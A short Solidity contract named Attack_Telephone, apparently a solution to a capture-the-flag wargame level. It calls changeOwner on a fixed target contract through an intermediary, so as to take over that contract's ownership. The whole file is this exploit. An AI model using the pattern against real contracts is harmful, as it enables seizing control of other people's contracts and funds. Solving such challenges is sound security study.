// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack_Telephone {
    // You'r address
    address owner = 0x0000000000000000000000000000000000000000;

    ITelephone target = ITelephone(0x9E1d8340E6BAd7b3Df86049C0deB2aD9A4fA8e21);

    function executer() external {
        target.changeOwner(owner);
    }
}

// Telephone interface
interface ITelephone {
    function changeOwner(address _owner) external;
}